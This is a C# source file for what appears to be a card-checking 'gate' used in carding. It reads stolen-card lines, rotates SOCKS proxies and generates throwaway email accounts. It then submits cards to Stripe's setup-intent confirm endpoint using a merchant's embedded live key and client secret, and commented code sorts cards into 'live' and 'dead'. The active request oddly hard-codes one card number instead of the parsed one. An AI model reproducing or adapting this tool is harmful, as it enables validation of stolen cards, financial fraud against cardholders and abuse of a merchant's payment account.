using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using RestSharp;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Card
    {
        check check = new check();
        Socks socks = new Socks();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string error = "";
        string ipUp = "";
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {


                //var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                pago();
            }

        }


        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();
                var prox = socks.proxy();
                var ip = prox.Split(':');

                ipUp = ip[1].ToString().Replace("//", "");

                WebProxy myproxy = new WebProxy(prox, true);

                if (lines > 0)
                {


                    string cc = Form1.listCC.Lines[0];
                    string[] ccLine = cc.Split('|');
                    var ccnum = ccLine[0];
                    var ccmes = ccLine[1];
                    var ccanio = ccLine[2].Remove(0, 2);
                    var CCV = ccLine[3];
                    Form1.circularProgressBar1.Value = 80;

                    var client = new RestClient("https://api.stripe.com/v1/setup_intents/seti_1IkI6JDecjLsXqEKzF4J9Qry/confirm");
                    client.Timeout = -1;

                    client.Proxy = myproxy;


                    var request = new RestRequest(Method.POST);
                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    request.AddParameter("payment_method_data[type]", "card");
                    request.AddParameter("payment_method_data[card][number]", "376653538801012");
                    request.AddParameter("payment_method_data[card][cvc]", "0000");
                    request.AddParameter("payment_method_data[card][exp_month]", "12");
                    request.AddParameter("payment_method_data[card][exp_year]", "21");
                    request.AddParameter("payment_method_data[guid]", "eac89ac6-ff32-4c4c-bc2f-91c804edc6841aa70a");
                    request.AddParameter("payment_method_data[muid]", "9be5a8b2-c2f6-44af-9401-2a4fc3600ecb1765c1");
                    request.AddParameter("payment_method_data[sid]", "ef9e8b2c-1842-4f40-8f5f-a1346a2a5f5ad34707");
                    request.AddParameter("payment_method_data[payment_user_agent]", "stripe.js/b5fc776e8; stripe-js-v3/b5fc776e8");
                    request.AddParameter("payment_method_data[time_on_page]", "74507");
                    request.AddParameter("payment_method_data[referrer]", "https://contabo.com/");
                    request.AddParameter("expected_payment_method_type", "card");
                    request.AddParameter("use_stripe_sdk", "true");
                    request.AddParameter("webauthn_uvpa_available", "false");
                    request.AddParameter("spc_eligible", "false");
                    request.AddParameter("key", "pk_live_51HH2BIDecjLsXqEKPxG7aAFTODSe38BxMf9s7icV8Iw7YGP1yA5xRlApyqciUNRLJ0lLACi7Ih2gEchTgeG4QWDx00y2QL6xWD");
                    request.AddParameter("client_secret", "seti_1IkI6JDecjLsXqEKzF4J9Qry_secret_JN2ANJ6R5GcKEGpH4bDmwFtUlulu8od");
                    IRestResponse response = client.Execute(request);

                    if (response.Content == "")
                    {
                        socks.proxyUp(ipUp);
                        Console.WriteLine(response.ErrorMessage.ToString());
                        pago();
                    }
                    else
                    {
                        Console.WriteLine(response.Content);
                        Console.WriteLine("------------" + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                        Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                        numeroTargeta++;
                        pagos++;
                        pago();


                    }



                    //if (confirmar())
                    //{
                    //    Form1.circularProgressBar1.Value = 100;
                    //    var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                    //    check.ccss(Variables.key, guardar, "lives");
                    //    Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                    //    Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                    //    Form1.textBox1.AppendText(Environment.NewLine);
                    //    Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                    //    numeroTargeta++;
                    //    pagos++;
                    //}
                    //else
                    //{
                    //    Form1.circularProgressBar1.Value = 100;
                    //    Thread.Sleep(300);
                    //    var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                    //    check.ccss(Variables.key, guardar, "deads");
                    //    Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                    //    Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                    //    Form1.textBox2.AppendText(Environment.NewLine);
                    //    Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                    //    numeroTargeta++;
                    //    pagos++;
                    //}



                }
            }
            catch (Exception ex)
            {
               
                pago();
            }

        }

        public void stop()
        {
            return;
        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}
